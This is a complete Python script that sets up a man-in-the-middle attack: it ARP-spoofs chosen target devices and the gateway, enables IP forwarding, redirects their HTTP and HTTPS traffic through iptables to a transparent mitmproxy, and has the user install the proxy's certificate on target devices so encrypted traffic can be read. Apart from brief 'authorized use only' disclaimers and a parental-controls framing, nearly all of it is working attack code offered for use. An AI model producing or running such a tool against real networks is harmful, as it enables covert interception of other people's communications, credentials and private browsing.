#!/usr/bin/env python3
"""
Man-in-the-Middle Setup for Traffic Interception
Uses ARP spoofing to redirect traffic through this computer for monitoring

IMPORTANT:
- Only use on networks you own
- For parental controls and authorized monitoring only
- Requires root/administrator privileges
- Legal use only - violating privacy laws is illegal

This redirects traffic from monitored devices through your computer
so you can decrypt and analyze HTTPS traffic.
"""

import scapy.all as scapy
import time
import sys
import subprocess
import os
import argparse
from colorama import init, Fore, Style
import sqlite3

init(autoreset=True)  # Initialize colorama

DB_PATH = 'network_activity.db'

class MITMSetup:
    def __init__(self, target_ips, gateway_ip, interface=None):
        self.target_ips = target_ips
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.running = True

    def enable_ip_forwarding(self):
        """Enable IP forwarding on the system"""
        print(f"{Fore.CYAN}[*] Enabling IP forwarding...{Style.RESET_ALL}")

        if sys.platform.startswith('linux'):
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            print(f"{Fore.GREEN}[✓] IP forwarding enabled (Linux){Style.RESET_ALL}")
        elif sys.platform == 'darwin':  # macOS
            os.system("sysctl -w net.inet.ip.forwarding=1")
            print(f"{Fore.GREEN}[✓] IP forwarding enabled (macOS){Style.RESET_ALL}")
        elif sys.platform == 'win32':
            # Windows requires registry change
            print(f"{Fore.YELLOW}[!] Windows IP forwarding setup:{Style.RESET_ALL}")
            print("    Run as Administrator:")
            print('    Set-NetIPInterface -Forwarding Enabled')
            input("    Press Enter after enabling IP forwarding...")
        else:
            print(f"{Fore.RED}[!] Unsupported platform{Style.RESET_ALL}")

    def disable_ip_forwarding(self):
        """Disable IP forwarding"""
        print(f"{Fore.CYAN}[*] Disabling IP forwarding...{Style.RESET_ALL}")

        if sys.platform.startswith('linux'):
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        elif sys.platform == 'darwin':
            os.system("sysctl -w net.inet.ip.forwarding=0")

        print(f"{Fore.GREEN}[✓] IP forwarding disabled{Style.RESET_ALL}")

    def get_mac(self, ip):
        """Get MAC address for an IP"""
        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

            if answered_list:
                return answered_list[0][1].hwsrc
            else:
                return None
        except Exception as e:
            print(f"{Fore.RED}[!] Error getting MAC for {ip}: {e}{Style.RESET_ALL}")
            return None

    def spoof(self, target_ip, spoof_ip):
        """Send ARP spoof packet"""
        target_mac = self.get_mac(target_ip)
        if not target_mac:
            return False

        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)
        return True

    def restore(self, destination_ip, source_ip):
        """Restore original ARP table"""
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)

        if destination_mac and source_mac:
            packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                             psrc=source_ip, hwsrc=source_mac)
            scapy.send(packet, count=4, verbose=False)

    def setup_iptables_redirect(self, port=8080):
        """Setup iptables to redirect traffic to mitmproxy"""
        if sys.platform.startswith('linux'):
            print(f"{Fore.CYAN}[*] Setting up iptables redirect to port {port}...{Style.RESET_ALL}")

            # Redirect HTTP and HTTPS to mitmproxy
            os.system(f"iptables -t nat -A PREROUTING -i {self.interface or 'eth0'} -p tcp --dport 80 -j REDIRECT --to-port {port}")
            os.system(f"iptables -t nat -A PREROUTING -i {self.interface or 'eth0'} -p tcp --dport 443 -j REDIRECT --to-port {port}")

            print(f"{Fore.GREEN}[✓] iptables rules added{Style.RESET_ALL}")

    def cleanup_iptables(self, port=8080):
        """Remove iptables rules"""
        if sys.platform.startswith('linux'):
            print(f"{Fore.CYAN}[*] Cleaning up iptables...{Style.RESET_ALL}")
            os.system(f"iptables -t nat -D PREROUTING -i {self.interface or 'eth0'} -p tcp --dport 80 -j REDIRECT --to-port {port}")
            os.system(f"iptables -t nat -D PREROUTING -i {self.interface or 'eth0'} -p tcp --dport 443 -j REDIRECT --to-port {port}")
            print(f"{Fore.GREEN}[✓] iptables rules removed{Style.RESET_ALL}")

    def start_spoofing(self):
        """Start ARP spoofing attack"""
        print(f"\n{Fore.YELLOW}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Starting ARP Spoofing{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Gateway: {self.gateway_ip}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Targets: {', '.join(self.target_ips)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Press Ctrl+C to stop{Style.RESET_ALL}\n")

        packet_count = 0

        try:
            while self.running:
                for target_ip in self.target_ips:
                    # Tell target we are the gateway
                    self.spoof(target_ip, self.gateway_ip)
                    # Tell gateway we are the target
                    self.spoof(self.gateway_ip, target_ip)

                packet_count += 1
                if packet_count % 10 == 0:
                    print(f"\r{Fore.GREEN}[*] Packets sent: {packet_count * len(self.target_ips) * 2}{Style.RESET_ALL}", end='')

                time.sleep(2)  # Send ARP packets every 2 seconds

        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}[!] Stopping ARP spoofing...{Style.RESET_ALL}")
            self.running = False

    def restore_network(self):
        """Restore network to original state"""
        print(f"{Fore.CYAN}[*] Restoring network...{Style.RESET_ALL}")

        for target_ip in self.target_ips:
            self.restore(target_ip, self.gateway_ip)
            self.restore(self.gateway_ip, target_ip)

        print(f"{Fore.GREEN}[✓] Network restored{Style.RESET_ALL}")


def get_default_gateway():
    """Get default gateway IP"""
    try:
        if sys.platform.startswith('linux') or sys.platform == 'darwin':
            result = subprocess.check_output("ip route | grep default", shell=True)
            gateway = result.decode().split()[2]
            return gateway
        elif sys.platform == 'win32':
            result = subprocess.check_output("ipconfig", shell=True).decode()
            for line in result.split('\n'):
                if "Default Gateway" in line and ":" in line:
                    gateway = line.split(":")[-1].strip()
                    if gateway:
                        return gateway
    except:
        pass
    return "192.168.1.1"  # Default fallback


def get_devices_from_db():
    """Get devices from database"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT id, ip_address, mac_address, hostname FROM devices ORDER BY last_seen DESC')
        devices = cursor.fetchall()
        conn.close()
        return devices
    except:
        return []


def main():
    parser = argparse.ArgumentParser(
        description='Setup Man-in-the-Middle for traffic interception',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Intercept traffic from specific IP
  sudo python setup_mitm.py --target 192.168.1.15

  # Intercept multiple devices
  sudo python setup_mitm.py --target 192.168.1.15 --target 192.168.1.20

  # Specify gateway manually
  sudo python setup_mitm.py --target 192.168.1.15 --gateway 192.168.1.1

  # Use specific network interface
  sudo python setup_mitm.py --target 192.168.1.15 --interface wlan0

IMPORTANT:
  - Requires root/administrator privileges
  - Only use on networks you own
  - For authorized monitoring only
  - Run mitmproxy in separate terminal: mitmdump --mode transparent -s https_interceptor.py
        '''
    )

    parser.add_argument('-t', '--target', action='append', required=True,
                       help='Target IP address(es) to intercept')
    parser.add_argument('-g', '--gateway', type=str,
                       help='Gateway IP address (auto-detected if not specified)')
    parser.add_argument('-i', '--interface', type=str,
                       help='Network interface (e.g., eth0, wlan0)')
    parser.add_argument('--list-devices', action='store_true',
                       help='List devices from database')

    args = parser.parse_args()

    # Check for root/admin
    if os.geteuid() != 0 if hasattr(os, 'geteuid') else True:
        print(f"{Fore.RED}[!] This script requires root/administrator privileges!{Style.RESET_ALL}")
        print("Run with: sudo python setup_mitm.py ...")
        sys.exit(1)

    # List devices if requested
    if args.list_devices:
        devices = get_devices_from_db()
        if devices:
            print(f"\n{Fore.CYAN}Devices in database:{Style.RESET_ALL}")
            for dev in devices:
                print(f"  {Fore.GREEN}[{dev[0]}]{Style.RESET_ALL} {dev[1]} - {dev[2]} ({dev[3] or 'Unknown'})")
        else:
            print(f"{Fore.YELLOW}[!] No devices found. Run scan_network.py first.{Style.RESET_ALL}")
        sys.exit(0)

    # Get gateway
    gateway = args.gateway or get_default_gateway()
    print(f"{Fore.CYAN}[*] Using gateway: {gateway}{Style.RESET_ALL}")

    # Setup MITM
    mitm = MITMSetup(args.target, gateway, args.interface)

    print(f"""
{Fore.YELLOW}╔═══════════════════════════════════════════════════════════╗
║         HTTPS Traffic Interceptor Setup                   ║
║         Man-in-the-Middle ARP Spoofing                    ║
╚═══════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.RED}WARNING: This will intercept ALL traffic from target devices!{Style.RESET_ALL}

{Fore.YELLOW}Before starting:{Style.RESET_ALL}
1. In another terminal, run:
   {Fore.GREEN}mitmdump --mode transparent -s https_interceptor.py{Style.RESET_ALL}

2. Install mitmproxy certificate on target devices:
   - Visit http://mitm.it from the target device
   - Download and install the certificate

3. Ensure IP forwarding is enabled

{Fore.CYAN}Target devices: {', '.join(args.target)}{Style.RESET_ALL}
{Fore.CYAN}Gateway: {gateway}{Style.RESET_ALL}

Press Ctrl+C to stop and restore network
    """)

    input(f"{Fore.YELLOW}Press Enter to start...{Style.RESET_ALL}")

    try:
        # Enable IP forwarding
        mitm.enable_ip_forwarding()

        # Setup iptables (Linux only)
        if sys.platform.startswith('linux'):
            mitm.setup_iptables_redirect()

        # Start ARP spoofing
        mitm.start_spoofing()

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
    finally:
        # Cleanup
        print(f"\n{Fore.CYAN}[*] Cleaning up...{Style.RESET_ALL}")

        if sys.platform.startswith('linux'):
            mitm.cleanup_iptables()

        mitm.restore_network()
        mitm.disable_ip_forwarding()

        print(f"\n{Fore.GREEN}[✓] Done. Network restored to normal.{Style.RESET_ALL}")


if __name__ == '__main__':
    main()
